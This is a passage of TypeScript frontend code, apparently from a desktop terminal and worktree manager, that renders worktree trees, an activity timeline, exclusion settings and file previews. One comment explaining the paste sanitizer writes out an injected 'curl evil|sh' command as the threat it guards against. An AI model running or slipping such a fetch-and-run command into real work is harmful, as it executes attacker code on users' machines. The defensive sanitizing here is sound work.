  // input). When present the row renders an <input> and forwards submit/cancel.
  editor?: { placeholder: string; onSubmit: (value: string) => void; onCancel: () => void };
}): HTMLElement {
  const row = document.createElement("div");
  row.className = "wt-node" + (opts.multi ? " multi" : "");
  row.style.paddingLeft = `${6 + opts.depth * 16}px`;

  const g = document.createElement("span");
  g.className = "wt-glyph";
  g.textContent = opts.glyph;
  if (opts.onGlyph)
    g.onclick = (e) => {
      e.stopPropagation();
      opts.onGlyph!();
    };
  row.appendChild(g);

  if (opts.star) {
    const star = document.createElement("span");
    star.className = "wt-star" + (opts.star.on ? " on" : "");
    star.textContent = opts.star.on ? "★" : "☆";
    star.title = opts.star.on ? "unfavorite" : "favorite";
    star.onclick = (e) => {
      e.stopPropagation();
      opts.star!.onToggle();
    };
    row.appendChild(star);
  }

  const label = document.createElement("span");
  label.className = "wt-label";
  label.textContent = opts.label;
  row.appendChild(label);

  if (opts.meta) {
    const m = document.createElement("span");
    m.className = "wt-meta";
    m.textContent = opts.meta;
    row.appendChild(m);
  }
  if (opts.dirty) {
    const d = document.createElement("span");
    d.className = "wt-dirty";
    d.textContent = "●";
    row.appendChild(d);
  }
  if (opts.path) {
    const p = document.createElement("span");
    p.className = "wt-path";
    p.textContent = tildify(opts.path);
    p.title = opts.path;
    row.appendChild(p);
  }

  if (opts.editor) {
    const inp = document.createElement("input");
    inp.className = "wt-add-input";
    inp.placeholder = opts.editor.placeholder;
    inp.onclick = (e) => e.stopPropagation();
    inp.onkeydown = (e) => {
      if (e.key === "Enter") opts.editor!.onSubmit(inp.value.trim());
      else if (e.key === "Escape") opts.editor!.onCancel();
    };
    row.appendChild(inp);
    queueMicrotask(() => inp.focus());
  }

  if (opts.actions?.length) {
    const acts = document.createElement("span");
    acts.className = "wt-actions";
    for (const a of opts.actions) {
      const b = document.createElement("button");
      b.className = "wt-act" + (a.cls ? ` ${a.cls}` : "");
      b.textContent = a.label;
      b.title = a.title;
      b.onclick = (e) => {
        e.stopPropagation();
        a.onClick(b);
      };
      acts.appendChild(b);
    }
    row.appendChild(acts);
  }

  if (opts.onLabel) row.onclick = (e) => opts.onLabel!(e);
  if (opts.onDblClick) row.ondblclick = (e) => opts.onDblClick!(e);
  if (opts.onContextMenu)
    row.oncontextmenu = (e) => {
      e.preventDefault();
      e.stopPropagation();
      opts.onContextMenu!(e);
    };
  return row;
}

// "/Users/me/projects/x" -> "~/projects/x" for compact display. Home is filled
// once at boot (see init) so this stays synchronous for render.
let homeDirCached = "";
function tildify(p: string): string {
  const h = homeDirCached.replace(/\/$/, "");
  return h && p.startsWith(h + "/") ? "~" + p.slice(h.length) : p;
}

function renderTree(rows: WorktreeRow[]) {
  const host = $("#wt-table");
  host.innerHTML = "";
  const wtExpanded = new Set(store.get().wtExpanded);
  const toggle = (key: string) => {
    const next = new Set(wtExpanded);
    next.has(key) ? next.delete(key) : next.add(key);
    store.set({ wtExpanded: [...next] }); // persists + re-renders via subscription
  };

  const wrap = document.createElement("div");
  wrap.className = "wt-tree";
  for (const org of buildTree(focusRows(rows))) {
    const okey = `o:${org.origin}`;
    const oOpen = wtExpanded.has(okey);
    wrap.appendChild(
      treeNode({
        depth: 0,
        glyph: oOpen ? "-" : "+",
        label: prettyOrigin(org.origin),
        meta: `${org.clones.length} clone${org.clones.length > 1 ? "s" : ""}`,
        multi: org.clones.length > 1,
        onGlyph: () => toggle(okey),
        onLabel: () => toggle(okey),
      }),
    );
    if (!oOpen) continue;

    for (const cl of org.clones) {
      const ckey = `${okey}|c:${cl.clone}`;
      const cOpen = wtExpanded.has(ckey);
      const adding = store.get().wtAddingClone === cl.clone;
      wrap.appendChild(
        treeNode({
          depth: 1,
          glyph: cl.worktrees.length ? (cOpen ? "-" : "+") : "",
          label: baseName(cl.clone),
          meta: adding ? undefined : cl.branch ? `@${cl.branch}` : "",
          onGlyph: cl.worktrees.length ? () => toggle(ckey) : undefined,
          onLabel: cl.worktrees.length && !adding ? () => toggle(ckey) : undefined,
          // "+ worktree": reveal an inline branch input on this checkout row.
          actions: adding
            ? undefined
            : [
                {
                  label: "+ worktree",
                  title: "add a git worktree under this checkout",
                  cls: "wt-add",
                  onClick: () => {
                    store.set({ wtAddingClone: cl.clone });
                    if (!cOpen) toggle(ckey); // expand so the new row is visible
                    else renderWorktreesPanel();
                  },
                },
              ],
          editor: adding
            ? {
                placeholder: "branch name…",
                onSubmit: (v) => submitAddWorktree(cl.clone, v),
                onCancel: () => {
                  store.set({ wtAddingClone: null });
                },
              }
            : undefined,
        }),
      );
      if (!cOpen) continue;

      for (const wt of cl.worktrees) {
        const live = sessionsForWorktree(wt.worktree);
        const g = leafGestures(cl.clone, wt.branch, wt.worktree, wt.dirty);
        const actions: RowAction[] = [
          {
            label: "open ▾",
            title: "open a NEW session here (pick an agent)",
            cls: "wt-open",
            onClick: (anchor) => {
              const r = anchor.getBoundingClientRect();
              showAgentMenu(r.left, r.bottom, cl.clone, wt.branch, wt.worktree, wt.dirty);
            },
          },
        ];
        if (live.length)
          actions.push({
            label: `resume${live.length > 1 ? ` (${live.length})` : ""}`,
            title: `attach existing session: ${live.map((s) => s.name).join(", ")}`,
            cls: "wt-resume",
            onClick: () => openTab(live[0].name),
          });
        wrap.appendChild(
          treeNode({
            depth: 2,
            glyph: "",
            label: wt.is_main ? "(main)" : baseName(wt.worktree),
            meta: `${wt.branch}  ${wt.head}`,
            dirty: wt.dirty,
            path: wt.worktree,
            star: { on: isFavWorktree(wt.worktree), onToggle: () => toggleFavWorktree(wt.worktree) },
            actions,
            // single = resume/pick · double = new session · right = picker
            onDblClick: () => g.onDouble(),
            onContextMenu: (e) => g.onContext(e.clientX, e.clientY),
            onLabel: (e) => g.onSingle(e.clientX, e.clientY),
          }),
        );
      }
    }
  }
  host.appendChild(wrap);
}

// Per-dtable sort state lives in store.tableSort keyed by a table id, so it
// survives the panel re-renders that selection/refresh trigger.
function tableSortFor(id: string, fallback: SortState): SortState {
  return store.get().tableSort[id] ?? fallback;
}
function onTableSort(id: string, s: SortState, rerender: () => void) {
  store.set({ tableSort: { ...store.get().tableSort, [id]: s } });
  rerender();
}

function renderFlatTable(rows: WorktreeRow[]) {
  const host = $("#wt-table");
  host.innerHTML = "";
  const sort = tableSortFor("worktrees", { col: 0, dir: "asc" });
  const gFor = (r: WorktreeRow) => leafGestures(r.clone, r.branch, r.worktree, r.dirty);
  host.appendChild(
    renderTable<WorktreeRow>({
      rows: focusRows(rows),
      sort,
      onSort: (s) => onTableSort("worktrees", s, () => renderFlatTable(store.get().worktrees)),
      columns: [
        {
          // Star indicator; toggle via right-click (favorite/unfavorite).
          header: "",
          cell: (r) => (isFavWorktree(r.worktree) ? "★" : "☆"),
          cellClass: (r) => (isFavWorktree(r.worktree) ? "wt-star on" : "wt-star"),
          sortKey: (r) => (isFavWorktree(r.worktree) ? 0 : 1),
        },
        { header: "org/repo", cell: (r) => prettyOrigin(r.origin), sortKey: (r) => r.origin },
        { header: "clone", cell: (r) => baseName(r.clone), sortKey: (r) => baseName(r.clone) },
        {
          header: "worktree",
          cell: (r) => (r.is_main ? "(main)" : baseName(r.worktree)),
          sortKey: (r) => (r.is_main ? "" : baseName(r.worktree)),
        },
        { header: "branch", cell: (r) => r.branch, sortKey: (r) => r.branch },
        { header: "head", cell: (r) => r.head, sortKey: (r) => r.head },
        { header: "path", cell: (r) => tildify(r.worktree), sortKey: (r) => r.worktree },
        {
          header: "",
          cell: (r) => (r.dirty ? "●" : ""),
          cellClass: (r) => (r.dirty ? "wt-dirty" : undefined),
          sortKey: (r) => (r.dirty ? 0 : 1), // dirty rows first on asc
        },
      ],
      rowTitle: (r) => r.worktree,
      // Same gesture model as the tree: single=resume/pick, dbl=new, right=menu.
      onRow: (r, e) => gFor(r).onSingle(e.clientX, e.clientY),
      onRowDblClick: (r) => gFor(r).onDouble(),
      onRowContextMenu: (r, e) => gFor(r).onContext(e.clientX, e.clientY),
    }),
  );
}

function renderWorktreesPanel() {
  // Panel may be closed / mid-remount when a store change fires this; bail.
  const count = document.querySelector<HTMLElement>("#wt-count");
  if (!count) return;
  const { worktrees, wtView, wtFocus, wtFavorites } = store.get();
  const shown = wtFocus ? worktrees.filter((r) => wtFavorites.includes(r.worktree)).length : worktrees.length;
  count.textContent = worktrees.length
    ? wtFocus
      ? `${shown}/${worktrees.length} ★`
      : `${worktrees.length} worktrees`
    : "";
  ($("#wt-view") as HTMLButtonElement).textContent =
    wtView === "tree" ? "Table" : "Tree";
  const focusBtn = document.querySelector<HTMLButtonElement>("#wt-focus");
  if (focusBtn) {
    focusBtn.textContent = wtFocus ? "★ Focus" : "☆ Focus";
    focusBtn.classList.toggle("on", wtFocus);
  }
  renderWtAgentsEditor();
  if (wtView === "tree") renderTree(worktrees);
  else renderFlatTable(worktrees);
}

async function scanWorktrees() {
  // Read from the panel input when it's mounted, else fall back to the persisted
  // root: onPanelShown can fire this before the worktrees DOM is queryable.
  const input = document.querySelector<HTMLInputElement>("#wt-root");
  const root = (input?.value ?? store.get().scanRoot).trim();
  store.set({ scanRoot: root }); // remember it
  const setCount = (s: string) => {
    const c = document.querySelector<HTMLElement>("#wt-count");
    if (c) c.textContent = s;
  };
  setCount("scanning…");
  try {
    const rows = await invoke<WorktreeRow[]>("scan_worktrees", {
      roots: root ? [root] : [],
      maxDepth: null,
    });
    store.set({ worktrees: rows });
  } catch (e) {
    console.error("scan_worktrees:", e);
    setCount("scan failed");
  }
}

// ---- activity: unified timeline of browser + os-capture + file events ----
const ACTIVITY_CAP = 2000;
const prettyUrl = (u: string) =>
  u.replace(/^https?:\/\//, "").replace(/^www\./, "");
function fmtTime(ts: number): string {
  const d = new Date(ts);
  const p = (n: number) => String(n).padStart(2, "0");
  return `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}

// Drop text into the active terminal (a row's text/url paste target).
// Strip C0 control chars + DEL (newlines, carriage returns, ESC) from text
// before it lands in a pty at the prompt. Activity rows (text/url/title arrive
// unauthenticated over the ingest server) flow through here on double-click; an
// embedded "\ncurl evil|sh\n" would otherwise auto-run on one click, and raw
// ESC could inject terminal escape sequences. Legit payloads (file paths,
// selections) carry no control chars, so this is a no-op for them.
function sanitizePaste(data: string): string {
  // eslint-disable-next-line no-control-regex
  return data.replace(/[\x00-\x1f\x7f]+/g, " ");
}

function pasteToActive(data: string) {
  const id = activeId();
  if (!id || !data) return;
  invoke("write_pty", { id, data: sanitizePaste(data) }).catch(console.error);
  tabs.get(id)?.term.focus();
}

// Where a row came from, for the source column: os captures show the frontmost
// app, browser rows the page title/host, file rows the file name.
function eventSource(e: Event): string {
  if (e.source === "os") return e.app || "screen";
  if (e.source === "files") return e.title || "file";
  return e.title || prettyUrl(e.url);
}
// The free-text payload fuzzy search runs over (and the search-key for a row).
function eventText(e: Event): string {
  return e.text || e.url || e.title;
}
function activityKey(e: Event): string {
  return `${e.kind} ${e.source} ${eventSource(e)} ${eventText(e)}`;
}

// Short source label for the row (the panel's one filter axis is source).
const SRC_LABEL: Record<Event["source"], string> = {
  os: "screen",
  browser: "web",
  files: "file",
  session: "session",
};
// Normalize the raw kind grab-bag into a small set of verbs for the row.
const ACTION_VERB: Record<string, string> = {
  nav: "visit",
  tabopen: "tab",
  tabclose: "tab",
  dblclick: "click",
  ctrlclick: "click",
  selection: "select",
  clipboard: "copy",
};
const actionVerb = (e: Event): string => ACTION_VERB[e.kind] ?? e.kind;

// The visible rows: source chip, then fuzzy search box.
function visibleActivity(): Event[] {
  const { activity, activitySource, activityQuery } = store.get();
  const filtered = activity.filter(
    (e) => activitySource === "all" || e.source === activitySource,
  );
  return fuzzyFilter(activityQuery, filtered, activityKey);
}

// Display-ready timeline rows for ActivityPanelV2. `title` mirrors v1's <tr
// title> (shot path wins, used by the global ctx-menu); `paste` is the
// dbl-click payload (text/url/title, never the shot path).
function actRows(): ActRow[] {
  return visibleActivity().map((e) => ({
    id: e.id,
    ts: e.ts,
    time: fmtTime(e.ts),
    source: e.source,
    src: SRC_LABEL[e.source],
    action: actionVerb(e),
    target: eventSource(e),
    title: e.shot || e.url || e.text || e.title,
    paste: eventText(e),
    kind: e.kind,
    // The previewable file path for this row, if any: a screenshot PNG (os) or
    // the logged file path (files). Routed to a split-right preview tab.
    filePath: e.shot || (e.source === "files" ? e.text : "") || undefined,
    shot: e.shot || undefined,
    url: e.url || undefined,
    text: e.text || undefined,
  }));
}

// Wire the ActivityPanelV2 bridge: derivation + handlers here, presentation in
// tablepanels.tsx. The panel re-renders on store change (useApp), so the
// record/chips/search state stays in the store, no DOM sync needed.
function registerActivityBridge() {
  setActivityPanel({
    rows: actRows,
    count: () => ({
      shown: visibleActivity().length,
      total: store.get().activity.length,
    }),
    source: () => store.get().activitySource,
    setSource: (s) => store.set({ activitySource: s as ActivitySource }),
    query: () => store.get().activityQuery,
    setQuery: (q) => store.set({ activityQuery: q }),
    recording: () => store.get().captureEnabled,
    toggleRecord: () => toggleRecording(),
    clear: () =>
      invoke("activity_clear")
        .then(() => store.set({ activity: [] }))
        .catch(console.error),
    hasEvents: () => store.get().activity.length > 0,
    onActivate: (r) => {
      if (r.paste) pasteToActive(r.paste + " ");
    },
    // Any file-backed row (screenshot PNG or logged file) opens the shared
    // file-preview in a split-right tab.
    openPreview: (path) => openPreviewPanel(path, undefined, "right"),
    perms: () => store.get().capturePerms,
    status: () => store.get().captureStatus,
    refreshPerms: refreshCapturePerms,
    requestScreen: () => {
      invoke("capture_request_screen")
        // The grant may not register until the OS prompt is dismissed; re-probe
        // shortly after so the banner clears once it's granted.
        .then(() => setTimeout(refreshCapturePerms, 500))
        .catch(console.error);
    },
    onShow: () => {
      if (store.get().activity.length === 0) refreshActivity();
      refreshCapturePerms();
    },
  });
}

// Probe macOS TCC + tap state for the Activity panel's capture banner.
function refreshCapturePerms() {
  invoke<CapturePerms>("capture_permissions")
    .then((p) => store.set({ capturePerms: p }))
    .catch(console.error);
}

// Load all sources once; the chip + search filter client-side (visibleActivity).
async function refreshActivity() {
  try {
    store.set({
      activity: await invoke<Event[]>("activity_events", {
        limit: ACTIVITY_CAP,
        source: null,
      }),
    });
  } catch (e) {
    console.error("activity_events:", e);
  }
}

// ---- config: observation filters (config.json), editable readout ----
async function refreshConfig() {
  try {
    store.set({ config: await invoke<ConfigView>("config_get") });
  } catch (e) {
    console.error("config_get:", e);
  }
}

// Persist a full set of rule lists and refresh the view from the backend.
async function applyConfig(sites: string[], files: string[], apps: string[]) {
  try {
    const view = await invoke<ConfigView>("config_set", {
      excludeSites: sites,
      excludeFiles: files,
      excludeApps: apps,
    });
    store.set({ config: view });
  } catch (e) {
    console.error("config_set:", e);
  }
}

// One editable rule group: removable chips + an add input. onChange gets the
// full next list for this group.
function cfgGroup(
  title: string,
  hint: string,
  items: string[],
  onChange: (next: string[]) => void,
): HTMLElement {
  const sec = document.createElement("div");
  sec.className = "cfg-group";
  const h = document.createElement("div");
  h.className = "cfg-group-head";
  h.innerHTML = `<b>${title}</b> <span class="muted">${hint}</span>`;
  sec.appendChild(h);

  const list = document.createElement("div");
  list.className = "cfg-chips";
  items.forEach((pat, i) => {
    const chip = document.createElement("span");
    chip.className = "cfg-chip";
    chip.textContent = pat;
    const x = document.createElement("span");
    x.className = "cfg-x";
    x.textContent = "×";
    x.onclick = () => onChange(items.filter((_, j) => j !== i));
    chip.appendChild(x);
    list.appendChild(chip);
  });
  sec.appendChild(list);

  const form = document.createElement("form");
  form.className = "cfg-add";
  const input = document.createElement("input");
  input.placeholder = "add pattern…";
  input.autocomplete = "off";
  const add = document.createElement("button");
  add.type = "submit";
  add.textContent = "+";
  form.appendChild(input);
  form.appendChild(add);
  form.onsubmit = (e) => {
    e.preventDefault();
    const v = input.value.trim();
    if (v && !items.includes(v)) onChange([...items, v]);
    input.value = "";
  };
  sec.appendChild(form);
  return sec;
}

function renderConfigPanel() {
  const meta = document.querySelector<HTMLElement>("#config-meta");
  const body = document.querySelector<HTMLElement>("#config-body");
  if (!meta || !body) return; // panel detached; a later show re-renders
  const cfg = store.get().config;
  if (!cfg) {
    meta.textContent = "";
    body.innerHTML = `<div class="empty-help">loading…</div>`;
    return;
  }
  meta.textContent =
    `${cfg.source}` + (cfg.excluded_count ? ` · ${cfg.excluded_count} blocked` : "");
  body.innerHTML = "";

  const head = document.createElement("div");
  head.className = "cfg-status";
  const errLine = cfg.error
    ? `<div class="cfg-err">⚠ ${escapeHtml(cfg.error)} — using defaults</div>`
    : "";
  head.innerHTML = `
    <div>loaded from <b>${escapeHtml(cfg.source)}</b></div>
    <code>${escapeHtml(cfg.path)}</code>
    ${errLine}
    <div class="muted">${cfg.excluded_count} events blocked since launch ·
      patterns are case-insensitive; <code>*</code> is a wildcard</div>`;
  body.appendChild(head);

  body.appendChild(
    cfgGroup(
      "Sites",
      "browser URLs to ignore (e.g. mail.google.com, *.bank.com)",
      cfg.exclude_sites,
      (next) => applyConfig(next, cfg.exclude_files, cfg.exclude_apps),
    ),
  );
  body.appendChild(
    cfgGroup(
      "Files",
      "file paths to ignore (e.g. /secret/, *.env)",
      cfg.exclude_files,
      (next) => applyConfig(cfg.exclude_sites, next, cfg.exclude_apps),
    ),
  );
  body.appendChild(
    cfgGroup(
      "Apps",
      "never screenshot while these apps are frontmost (e.g. 1Password)",
      cfg.exclude_apps,
      (next) => applyConfig(cfg.exclude_sites, cfg.exclude_files, next),
    ),
  );
}

// ---- files: a Windows-Explorer-style filesystem browser + media preview ----
const IMAGE_EXTS = new Set([
  "png", "jpg", "jpeg", "gif", "webp", "bmp", "svg", "ico", "avif",
]);

function fmtSize(n: number): string {
  if (n < 1024) return `${n} B`;
  const u = ["KB", "MB", "GB", "TB"];
  let v = n / 1024;
  let i = 0;
  while (v >= 1024 && i < u.length - 1) {
    v /= 1024;
    i++;
  }
  return `${v.toFixed(v < 10 ? 1 : 0)} ${u[i]}`;
}
function fmtDate(ts: number): string {
  if (!ts) return "";
  const d = new Date(ts);
  const p = (n: number) => String(n).padStart(2, "0");
  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}`;
}
function fileGlyph(e: FsEntry): string {
  if (e.is_dir) return "📁";
  if (IMAGE_EXTS.has(e.ext)) return "🖼";
  return "📄";
}
function typeLabel(e: FsEntry): string {
  if (e.is_dir) return "Folder";
  return e.ext ? `${e.ext.toUpperCase()} file` : "File";
}

// Record a file reference in the unified activity store (source='files').
function logFileOpen(e: FsEntry) {
  invoke("activity_log", {
    source: "files",
    kind: "open",
    title: e.name,
    text: e.path,
  }).catch(console.error);
}

// Load a new tree root. Resets the expanded-children cache — those listings
// belong to the previous root. Reused by Up / Go / folder double-click / onShow.
async function loadFsRoot(path: string) {
  try {
    const listing = await invoke<DirListing>("list_dir", { path });
    store.set({ files: listing, fsCwd: listing.path, fsChildren: {}, fsSelected: null });
  } catch (e) {
    console.error("list_dir:", e);
  }
}

// Lazily load one folder's children the first time it's expanded; no-op if the
// listing is already cached. The new listing is merged into fsChildren (a fresh
// ref) so the FilesPanelV2 re-renders with the subrows present.
async function loadFsChildren(path: string) {
  if (store.get().fsChildren[path]) return;
  try {
    const listing = await invoke<DirListing>("list_dir", { path });
    store.set({ fsChildren: { ...store.get().fsChildren, [path]: listing.entries } });
  } catch (e) {
    console.error("list_dir:", e);
  }
}

function filesGoUp() {
  const f = store.get().files;
  if (f?.parent) loadFsRoot(f.parent);
}

// Build the display-ready tree rows from the root listing + the per-folder
// children loaded so far. Recursive: a folder's children are present once
// loadFsChildren has cached them, undefined otherwise (twisty still shows).
function toFsRow(e: FsEntry): FsRow {
  const kids = e.is_dir ? store.get().fsChildren[e.path] : undefined;
  return {
    path: e.path,
    name: e.name,
    isDir: e.is_dir,
    glyph: fileGlyph(e),
    date: fmtDate(e.modified),
    type: typeLabel(e),
    size: e.is_dir ? "" : fmtSize(e.size),
    sortName: `${e.is_dir ? 0 : 1}\t${e.name.toLowerCase()}`,
    sortSize: e.is_dir ? -1 : e.size,
    modified: e.modified,
    children: kids ? kids.map(toFsRow) : undefined,
  };
}
function fsRows(): FsRow[] {
  return (store.get().files?.entries ?? []).map(toFsRow);
}

// File extension -> shiki language id. Anything not listed falls back to plain
// text (shiki still renders it, just unhighlighted).
const MD_EXTS = new Set(["md", "markdown", "mdx"]);
const SHIKI_LANG: Record<string, string> = {
  ts: "typescript", tsx: "tsx", mts: "typescript", cts: "typescript",
  js: "javascript", jsx: "jsx", mjs: "javascript", cjs: "javascript",
  json: "json", jsonc: "json", css: "css", scss: "scss", less: "less",
  html: "html", xml: "xml", svg: "xml", vue: "vue", svelte: "svelte",
  rs: "rust", py: "python", rb: "ruby", go: "go", php: "php", java: "java",
  kt: "kotlin", swift: "swift", c: "c", h: "c", cpp: "cpp", hpp: "cpp",
  cc: "cpp", cs: "csharp", sh: "bash", bash: "bash", zsh: "bash",
  yml: "yaml", yaml: "yaml", toml: "toml", sql: "sql", lua: "lua",
  dockerfile: "docker", makefile: "makefile",
};

const escapeHtml = (s: string) =>
  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

// ---- per-path preview tabs ----
// Previews are dynamic dock panels keyed by path (preview:<path>), like xterm
// sessions. main.ts owns each instance's content node and renders into it;
// reactdock hosts the node. No untitled buffers: every preview names a path.
type PreviewInst = { el: HTMLElement; line?: number };
const previewInsts = new Map<string, PreviewInst>();

// Open (or focus) the preview tab for `path`. A `line` (>0) selects the
// line-numbered source view scrolled to that row; otherwise the rendered view
// (image / markdown / syntax-highlighted code).
function openPreviewPanel(
  path: string,
  line?: number,
  direction: "within" | "right" = "within",
) {
  let inst = previewInsts.get(path);
  if (!inst) {
    const el = document.createElement("div");
    el.className = "fs-preview";
    inst = { el, line };
    previewInsts.set(path, inst);
  } else {
    inst.line = line;
  }
  addPreviewPanel(path, path.split("/").pop() ?? path, inst.el, direction);
  renderPathInto(inst.el, path, line);
}

// Render `path` into `node`: images via read_image, markdown via marked, a
// `line` request via the line-numbered source view, everything else via shiki.
async function renderPathInto(node: HTMLElement, path: string, line?: number) {
  const name = path.split("/").pop() ?? path;
  const ext = (name.includes(".") ? name.split(".").pop()! : "").toLowerCase();
  const empty = (s: string) => `<div class="fs-preview-empty">${s}</div>`;
  const meta = `<div class="fs-preview-meta">${name}<br><span>${line ? `${path}:${line}` : path}</span></div>`;
  node.innerHTML = meta + empty("loading…");

  if (!line && IMAGE_EXTS.has(ext)) {
    try {
      const url = await invoke<string>("read_image", { path });
      node.innerHTML = meta + `<img class="fs-preview-img" src="${url}" alt="" />`;
    } catch (e) {
      node.innerHTML = meta + empty(String(e));
    }
    return;
  }

  let text: string;
  try {
    text = await invoke<string>("read_text", { path });
  } catch (e) {
    node.innerHTML = meta + empty(String(e));
    return;
  }

  if (line) {
    // Whole file with line numbers; the target row is highlighted and scrolled
    // to center. Capped so a giant source file stays responsive.
    const lines = text.split("\n");
    const CAP = 2000;
    const hi = Math.min(lines.length, CAP);
    const body = lines
      .slice(0, hi)
      .map((l, i) => {
        const n = i + 1;
        const cls = n === line ? "src-line on" : "src-line";
        const num = String(n).padStart(4, " ");
        return `<div class="${cls}" data-n="${n}"><span class="src-n">${num}</span>${escapeHtml(l) || " "}</div>`;
      })
      .join("");
    const tail = hi < lines.length ? `<div class="src-elide">… ${lines.length - hi} more lines</div>` : "";
    node.innerHTML = meta + `<pre class="src-pre">${body}${tail}</pre>`;
    node.querySelector(".src-line.on")?.scrollIntoView({ block: "center" });
    return;
  }

  if (MD_EXTS.has(ext)) {
    const html = DOMPurify.sanitize(await marked.parse(text));
    node.innerHTML = meta + `<div class="md-body">${html}</div>`;
    return;
  }

  const theme = store.get().mode === "dark" ? "github-dark" : "github-light";
  const lang = SHIKI_LANG[ext] || SHIKI_LANG[name.toLowerCase()] || "text";
  try {
    const html = await codeToHtml(text, { lang, theme });
    node.innerHTML = meta + `<div class="code-body">${html}</div>`;
  } catch {
    node.innerHTML = meta + `<pre class="code-plain">${escapeHtml(text)}</pre>`;
  }
}

// On theme flip, re-render the open (non-source) previews so syntax colors track
// light/dark. Closed instances keep their cached node; reopening re-renders.
store.subscribe(() => {
  for (const [path, inst] of previewInsts) {
    if (!inst.line && isPreviewOpen(path)) renderPathInto(inst.el, path, inst.line);
  }
}, ["mode"]);

// Wire the FilesPanelV2 bridge: derivation + handlers live here, next to the
// list_dir loaders; the React panel (tablepanels.tsx) stays presentational.
function registerFilesBridge() {
  setFilesPanel({
    rows: fsRows,
    path: () => store.get().files?.path ?? store.get().fsCwd,
    hasParent: () => !!store.get().files?.parent,
    goUp: filesGoUp,
    goTo: (path) => loadFsRoot(path),
    selected: () => store.get().fsSelected,
    onShow: () => { if (!store.get().files) loadFsRoot(store.get().fsCwd); },
    onToggle: (r, willExpand) => { if (willExpand) loadFsChildren(r.path); },
    // Single click: folders are expanded via the twisty, so a folder row-click is
    // a no-op; a file selects + opens its preview tab.
    onOpen: (r) => {
      if (r.isDir) return;
      store.set({ fsSelected: r.path });
      openPreviewPanel(r.path);
    },
    // Double click: descend into a folder (new tree root); paste a file's path.
    onActivate: (r) => {
      if (r.isDir) {
        loadFsRoot(r.path);
        return;
      }
      pasteToActive(pathArg(r.path) + " ");
      logFileOpen({ name: r.name, path: r.path } as FsEntry);
    },
  });
}

// syncToggles now reads from the plugin registry instead of a hardcoded list.
function syncToggles() {
  for (const p of allPanels()) {
    const btn = document.getElementById(`${p.id}-toggle`);
    if (btn) btn.classList.toggle("active", isOpen(p.id));
  }
}

// Activity rail compact (icons) vs big (icons + labels).
function syncSidebar(s: AppState) {
  $("#actbar").dataset.mode = s.sidebar;
  applyRailWidth();
}

// Big mode honors the persisted drag width; compact falls back to the fixed
// 44px CSS rule (clear the inline width so it isn't pinned wide).
function applyRailWidth() {
  const bar = $("#actbar");
  if (store.get().sidebar === "big") bar.style.width = `${store.get().sidebarWidth}px`;
  else bar.style.removeProperty("width");
}

// Drag the divider on the rail's right edge to resize it (big mode only); the
// width persists in the store. Pointer capture so the drag survives fast moves.
function wireRailResize() {
  const grip = $("#actbar-resize");
  grip.addEventListener("pointerdown", (e) => {
    if (store.get().sidebar !== "big") return;
    e.preventDefault();
    grip.setPointerCapture(e.pointerId);
    const startX = e.clientX;
    const startW = store.get().sidebarWidth;
    const onMove = (ev: PointerEvent) => {
      const w = Math.max(96, Math.min(360, startW + (ev.clientX - startX)));
      store.set({ sidebarWidth: w });
      applyRailWidth();
    };
    const onUp = (ev: PointerEvent) => {
      grip.releasePointerCapture(ev.pointerId);
      grip.removeEventListener("pointermove", onMove);
      grip.removeEventListener("pointerup", onUp);
    };
    grip.addEventListener("pointermove", onMove);
    grip.addEventListener("pointerup", onUp);
  });
}

// ---- store-driven view sync: skin and mode push to the DOM + controls ----
function syncSkin(s: AppState) {
  document.body.dataset.skin = s.skin;
  // Button shows the skin it switches TO.
  ($("#skin-toggle") as HTMLButtonElement).textContent = nextSkin(s.skin).toUpperCase();
  for (const t of tabs.values()) {
    t.term.options.theme = THEMES[s.skin];
    t.fit.fit();
  }
}
function syncMode(s: AppState) {
  document.body.dataset.mode = s.mode;
  ($("#mode-toggle") as HTMLButtonElement).textContent =
    s.mode === "dark" ? "☀" : "☾";
}
// While true, the blur-to-hide handler stands down (the screenshot crosshair
// steals focus, which would otherwise hide us mid-capture).
let capturing = false;

// Blur-to-hide is deferred, not immediate: dragging a file in from Finder blurs
// us (the source app goes active), and an immediate hide would vanish the window
// before the drop lands. The pending hide is cancelled when a drag enters or
// focus returns.
let hideTimer: number | undefined;
function cancelHide() {
  if (hideTimer !== undefined) {
    clearTimeout(hideTimer);
    hideTimer = undefined;
  }
}

// Hide the popover, let the user crosshair-select a region, return the saved PNG
// path (null on Esc / missing Screen Recording permission). Window is restored
// before returning; the blur guard stays up briefly so the focus settling after
// show() doesn't trip click-outside-to-hide.
async function captureRegion(): Promise<string | null> {
  const win = getCurrentWindow();
  capturing = true;
  await win.hide();
  let path: string | null = null;
  try {
    path = await invoke<string>("screenshot");
  } catch (e) {
    console.error("screenshot:", e);
  }
  await win.show();
  await win.setFocus();
  setTimeout(() => (capturing = false), 300);
  return path;
}

// Write text into a terminal's pty (path or selection, space-terminated so the
// next token is separate) and focus it.
async function sendTextToTab(id: string, text: string) {
  if (!tabs.has(id)) return;
  await invoke("write_pty", { id, data: text }).catch(console.error);
  tabs.get(id)?.term.focus();
}

// Flip screen-capture recording on/off. Front owns the persisted flag; the
// backend mirrors it (and swaps the menu-bar icon) via capture_set_enabled.
// Shared by the Activity panel button and the tray menu item.
function toggleRecording() {
  const on = !store.get().captureEnabled;
  store.set({ captureEnabled: on });
  invoke("capture_set_enabled", { on }).catch(console.error);
}

// Main Shot button: capture a region and send its path to the active terminal.
async function captureToPrompt() {
  const id = activeId();
  const path = await captureRegion();
  if (path && id) await sendTextToTab(id, path + " ");
}

// Open terminals in most-recently-focused order, for the send picker.
function recentTabs(): Tab[] {
  const seen = new Set<string>();
  const out: Tab[] = [];
  for (const id of tabRecency) {
    const t = tabs.get(id);
    if (t && !seen.has(id)) {
      seen.add(id);
      out.push(t);
    }
  }
  // Any open tab not yet in the recency list (e.g. reattached on boot) trails.
  for (const [id, t] of tabs) if (!seen.has(id)) out.push(t);
  return out;
}

// "Send to" picker: a popover table of open terminals (recent first). Each row
// can receive a fresh screenshot or the active terminal's current selection.
function openSendPicker(anchor: HTMLElement) {
  document.querySelector("#send-picker")?.remove();
  const list = recentTabs();
  const pop = document.createElement("div");
  pop.id = "send-picker";
  pop.className = "send-picker";

  const sel = tabs.get(activeId() ?? "")?.term.getSelection() ?? "";
  const head = document.createElement("div");
  head.className = "send-picker-head";
